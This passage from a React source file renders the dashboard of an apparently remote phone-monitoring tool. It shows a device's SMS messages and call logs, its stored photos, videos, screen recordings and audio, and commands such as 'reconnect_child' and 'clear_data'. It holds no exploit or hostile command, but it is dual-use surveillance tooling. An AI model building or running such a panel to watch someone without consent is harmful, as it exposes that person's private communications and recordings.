                      className={`tab-btn ${activeCommTab === 'calls' ? 'active' : ''}`}
                      onClick={() => setActiveCommTab('calls')}
                    >
                      Call Logs
                    </button>
                  </div>
                  <div className="tab-content">
                    {activeCommTab === 'sms' && (
                      <div className="messages-list">
                        {smsLogs.length === 0 ? (
                          <p>No SMS messages available.</p>
                        ) : (
                          smsLogs.map((smsMessage) => (
                            <div key={smsMessage.id} className="message-item">
                              <div className="message-header">
                                <strong>{smsMessage.number}</strong>
                                <span className={`sms-badge ${smsMessage.type}`}>{smsMessage.type}</span>
                                <small>{smsMessage.timestamp}</small>
                              </div>
                              <p className="message-content">{smsMessage.content}</p>
                            </div>
                          ))
                        )}
                      </div>
                    )}
                    {activeCommTab === 'calls' && (
                      <div className="call-log-table-container">
                        {callLogs.length === 0 ? (
                          <p>No call logs available.</p>
                        ) : (
                          <>
                            <table className="call-log-table">
                              <thead>
                                <tr>
                                  <th>Name</th>
                                  <th>Phone Number</th>
                                  <th>Status</th>
                                  <th>Type</th>
                                  <th>Duration</th>
                                  <th>Date</th>
                                </tr>
                              </thead>
                              <tbody>
                                {callLogs
                                  .slice(
                                    currentPage.calls * itemsPerPage,
                                    (currentPage.calls + 1) * itemsPerPage
                                  )
                                  .map((call) => (
                                    <tr key={call.id}>
                                      <td>{call.name}</td>
                                      <td>{call.number}</td>
                                      <td>
                                        <span
                                          className={`status-badge ${getCallStatus(
                                            call.type
                                          ).toLowerCase()}`}
                                        >
                                          {getCallStatus(call.type)}
                                        </span>
                                      </td>
                                      <td>{call.type}</td>
                                      <td>{formatDuration(call.duration)}</td>
                                      <td>{new Date(call.date).toLocaleString()}</td>
                                    </tr>
                                  ))}
                              </tbody>
                            </table>
                            <div className="pagination-controls">
                              <button
                                onClick={() =>
                                  setCurrentPage((prev) => ({
                                    ...prev,
                                    calls: Math.max(0, prev.calls - 1),
                                  }))
                                }
                                disabled={currentPage.calls === 0}
                              >
                                Previous
                              </button>
                              <span>
                                Page {currentPage.calls + 1} of{' '}
                                {Math.ceil(callLogs.length / itemsPerPage)}
                              </span>
                              <button
                                onClick={() =>
                                  setCurrentPage((prev) => ({
                                    ...prev,
                                    calls: Math.min(
                                      prev.calls + 1,
                                      Math.ceil(callLogs.length / itemsPerPage) - 1
                                    ),
                                  }))
                                }
                                disabled={
                                  currentPage.calls >=
                                  Math.ceil(callLogs.length / itemsPerPage) - 1
                                }
                              >
                                Next
                              </button>
                            </div>
                          </>
                        )}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            )}

            {activeSection === 'storage' && (
              <div className="storage-section">
                <div className="section-header">
                  <h3>File Storage</h3>
                  <div className="button-group">
                    <button className="btn-secondary" onClick={deleteSelectedFiles}>
                      🗑️ Delete Selected Files
                    </button>
                    <button className="btn-primary" onClick={fetchStorage}>
                      🔄 Refresh Storage
                    </button>
                  </div>
                </div>

                <div className="storage-stats">
                  <div className="stat-card">
                    <div className="stat-icon">📁</div>
                    <div>
                      <h4>Total Files:</h4>
                      <p>{files.length}</p>
                    </div>
                  </div>
                  <div className="stat-card">
                    <div className="stat-icon">💾</div>
                    <div>
                      <h4>Storage Used:</h4>
                      <p>{calculateStorageUsed()} MB</p>
                    </div>
                  </div>
                </div>

                <div className="files-table">
                  <table>
                    <thead>
                      <tr>
                        <th>Name</th>
                        <th>Type</th>
                        <th>Size</th>
                        <th>Date</th>
                        <th>Actions</th>
                      </tr>
                    </thead>
                    <tbody>
                      {files.map((file) => (
                        <tr key={file.name}>
                          <td>
                            <div className="file-info">
                              <input
                                type="checkbox"
                                checked={selectedFiles.includes(file.name)}
                                onChange={(e) => {
                                  if (e.target.checked) {
                                    setSelectedFiles([...selectedFiles, file.name]);
                                  } else {
                                    setSelectedFiles(selectedFiles.filter((name) => name !== file.name));
                                  }
                                }}
                                style={{ marginRight: '10px' }}
                              />
                              <span className="file-icon">
                                {file.type === 'image'
                                  ? '🖼️'
                                  : file.type === 'video'
                                  ? '🎥'
                                  : file.type === 'screen_record'
                                  ? '🖥️'
                                  : file.type === 'audio'
                                  ? '🎙️'
                                  : '📜'}
                              </span>
                            </div>
                          </td>
                          <td>
                            <span className="file-badge">{file.type}</span>
                          </td>
                          <td>{file.size} KB</td>
                          <td>{new Date(file.timestamp).toLocaleDateString()}</td>
                          <td>
                            <div className="action-buttons">
                              <button
                                className="btn-small"
                                onClick={() => downloadFile(file.name)}
                                title="Download file"
                              >
                                📥
                              </button>
                              <button
                                className="btn-small"
                                onClick={() => setModalFile(file)}
                                title="Preview file"
                              >
                                👁️
                              </button>
                              <button
                                className="btn-small"
                                onClick={() => deleteFile(file.name)}
                                title="Delete file"
                              >
                                🗑️
                              </button>
                            </div>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}

            {activeSection === 'controls' && (
              <div className="controls-section">
                <div className="section-header">
                  <h3>System Controls</h3>
                  <button className="btn-primary" onClick={() => sendCommand('reconnect_child')}>
                    🔄 Reconnect Device
                  </button>
                </div>

                <div className="control-groups">
                  <div className="control-group">
                    <h4>Data Management:</h4>
                    <div className="button-group">
                      <button className="btn-secondary" onClick={() => sendCommand('clear_cache')}>
                        Clear Cache
                      </button>
                      <button className="btn-secondary" onClick={() => sendCommand('clear_data')}>
                        Clear App Data
                      </button>
                    </div>
                  </div>
                  <div className="control-group">
                    <h4>Device Actions:</h4>
                    <div className="button-group">
                      <button
                        className="btn-primary"
                        onClick={() => sendCommand('get_device_info')}
                        disabled={!deviceConnected}
                      >
                        🔄 Refresh Device Info
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </main>
        </div>
      </div>

      {toastMessage && (
        <div className="toast">
          <span>{toastMessage}</span>
          <button onClick={() => setToastMessage('')}>✕</button>
        </div>
      )}

      {modalFile && (
        <div className="modal-overlay" onClick={() => setModalFile(null)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <button className="modal-close" onClick={() => setModalFile(null)}>
              ×
            </button>
            <h3>File Preview: {modalFile.name}</h3>
            <div className="modal-file-content">
              {modalFile.type === 'image' ? (
                <img
                  src={`${API_BASE_URL}/storage/${selectedDevice}/${modalFile.name}`}
                  alt="Image preview"
                  style={{ maxWidth: '100%', maxHeight: '400px' }}
                />
              ) : (modalFile.type === 'video' || modalFile.type === 'screen_record') ? (
                <video
                  controls
                  style={{ maxWidth: '100%', maxHeight: '400px' }}
                  preload="metadata"
                >
                  <source
                    src={`${API_BASE_URL}/storage/${selectedDevice}/${modalFile.name}`}
                    type="video/mp4"
                  />
                  Your browser does not support video playback.
                </video>
              ) : modalFile.type === 'audio' ? (
                <div style={{ padding: '20px', textAlign: 'center' }}>
                  <audio
                    style={{ width: '100%', marginBottom: '20px' }}
                    onError={() => showToast('Error: Audio playback not supported in this browser')}
                    controls
                  >
                    <source
                      src={`${API_BASE_URL}/storage/${selectedDevice}/${modalFile.name}`}
                      type="audio/aac"
                    />
                    <source
                      src={`${API_BASE_URL}/storage/${selectedDevice}/${modalFile.name}`}
                      type="audio/ogg"
                    />
                    Your browser does not support audio playback.
                  </audio>
                  <p>🎵 Audio File: {modalFile.name}</p>
                </div>
              ) : (
                <div className="preview-placeholder">
                  <span>📜</span>
                  <p>Preview not available for this file type</p>
                  <small>Use download to view the file</small>
                </div>
              )}
            </div>
            <div className="modal-actions">
              <button className="btn btn-primary" onClick={() => downloadFile(modalFile.name)}>
                📥 Download
              </button>
              <button className="btn btn-secondary" onClick={() => setModalFile(null)}>
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {isLoading && (
        <div className="loader-container">
          <div className="loader"></div>
        </div>
      )}
    </div>
  );
}

export default App;
